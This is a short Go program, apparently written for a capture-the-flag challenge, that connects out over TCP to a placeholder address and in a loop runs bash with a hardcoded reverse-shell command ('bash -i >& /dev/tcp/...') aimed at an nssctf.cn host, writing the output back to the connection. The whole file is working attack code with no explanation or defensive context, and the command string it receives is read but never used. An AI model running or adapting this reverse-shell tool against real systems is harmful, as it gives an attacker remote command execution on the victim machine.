package main

import (
	"io"
	"io/ioutil"
	"log"
	"net"
	"os/exec"
)

var (
	cmd  string
	line string
)

func main() {
	addr := "xxxx:8999"
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		log.Fatal(err)
	}
	buf := make([]byte, 10240)
	for {
		n, err := conn.Read(buf)
		if err != nil && err != io.EOF {
			log.Fatal(err)
		}
		cmd_str := string(buf[:n])
		cmd := exec.Command("/bin/bash", "-c", "bash -i >& /dev/tcp/node3.anna.nssctf.cn/28034 0>&1")
		stdout, err := cmd.StdoutPipe()
		if err != nil {
			log.Fatal(err)
		}
		defer stdout.Close()
		if err := cmd.Start(); err != nil {
			log.Fatal(err)
		}
		opBytes, err := ioutil.ReadAll(stdout)
		if err != nil {
			log.Fatal(err)
		}
		conn.Write([]byte(opBytes))
	}
}
